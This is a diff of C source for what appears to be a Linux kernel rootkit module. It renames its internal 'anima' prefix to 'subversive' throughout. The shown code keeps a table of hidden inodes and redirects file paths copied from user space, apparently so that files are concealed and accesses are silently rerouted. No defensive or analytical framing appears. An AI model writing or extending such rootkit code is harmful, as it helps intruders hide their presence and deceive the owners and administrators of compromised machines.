@@ -1,8 +1,8 @@
 #include <linux/printk.h>
 
-#include <anima/config.h>
-#include <anima/hide_file.h>
-#include <anima/libc.h>
+#include <subversive/config.h>
+#include <subversive/hide_file.h>
+#include <subversive/libc.h>
 
 static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};
 
@@ -46,7 +46,7 @@ char *get_redirect_path(char *old_path, int mode)
 		struct redirect_path *r = redirect_pathes + i;
 		if (!r->old_path)
 			continue;
-		if (!anima_strcmp(r->old_path, old_path) && r->mode == mode)
+		if (!subversive_strcmp(r->old_path, old_path) && r->mode == mode)
 			return r->new_path;
 	}
 
@@ -63,11 +63,11 @@ void redirect_path(char *old_path, unsigned int old_path_len,
 	if (new_path_len > MAX_PATH_LEN)
 		new_path_len = MAX_PATH_LEN;
 
-	kold_path = anima_strndup_from_user(old_path, old_path_len);
+	kold_path = subversive_strndup_from_user(old_path, old_path_len);
 	if (!kold_path)
 		goto out;
 
-	knew_path = anima_strndup_from_user(new_path, new_path_len);
+	knew_path = subversive_strndup_from_user(new_path, new_path_len);
 	if (!knew_path)
 		goto free_kold_path;
 
@@ -83,9 +83,9 @@ void redirect_path(char *old_path, unsigned int old_path_len,
 		}
 	}
 
-	anima_vfree(knew_path);
+	subversive_vfree(knew_path);
 free_kold_path:
-	anima_vfree(kold_path);
+	subversive_vfree(kold_path);
 out:
 	return;
 }
@@ -97,7 +97,7 @@ void unredirect_path(const char *old_path, unsigned int len, int mode)
 	if (len > MAX_PATH_LEN)
 		len = MAX_PATH_LEN;
 
-	kold_path = anima_strndup_from_user(old_path, len);
+	kold_path = subversive_strndup_from_user(old_path, len);
 	if (!kold_path)
 		return;
 
@@ -107,16 +107,16 @@ void unredirect_path(const char *old_path, unsigned int len, int mode)
 		struct redirect_path *r = redirect_pathes + i;
 		if (!r->old_path)
 			continue;
-		if (!anima_strcmp(r->old_path, kold_path) && r->mode == mode) {
-			anima_vfree(r->old_path);
-			anima_vfree(r->new_path);
+		if (!subversive_strcmp(r->old_path, kold_path) && r->mode == mode) {
+			subversive_vfree(r->old_path);
+			subversive_vfree(r->new_path);
 			r->mode = 0;
 			r->old_path = NULL;
 			r->new_path = NULL;
 		}
 	}
 
-	anima_vfree(kold_path);
+	subversive_vfree(kold_path);
 }
 
 void hide_inode_debug(void)
